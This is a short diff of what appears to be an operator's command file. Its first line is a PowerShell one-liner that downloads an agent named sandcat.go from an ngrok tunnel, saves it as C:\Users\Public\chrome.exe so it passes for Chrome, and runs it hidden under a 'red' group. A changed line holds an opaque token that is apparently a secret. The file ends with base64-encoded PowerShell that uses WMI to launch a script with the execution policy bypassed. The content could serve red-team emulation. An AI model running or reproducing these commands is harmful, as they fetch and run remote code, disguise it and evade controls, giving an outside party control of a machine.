@@ -1,5 +1,5 @@
 $server="https://861c19b09579.ngrok-free.app";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\chrome.exe"} | stop-process -f;rm -force "C:\Users\Public\chrome.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\chrome.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\chrome.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
-bMgMHCBrg3gE-Mvi4iFqNOF8FyWN_Bbje27G1qNTHrU
+n-932oM2IdcMXKK8gcMh3qS83xX3R7y2y5UIQjQiACI
 
 
 SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAnAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAAYQBzAHMAIAAtAEYAaQBsAGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAGUAeAB0AC4AYgBnAGEAcgBjAGkAYQBcAEQAZQBzAGsAdABvAHAAXABzAHAAbAB1AG4AawAuAHAAcwAxACIAJwA=
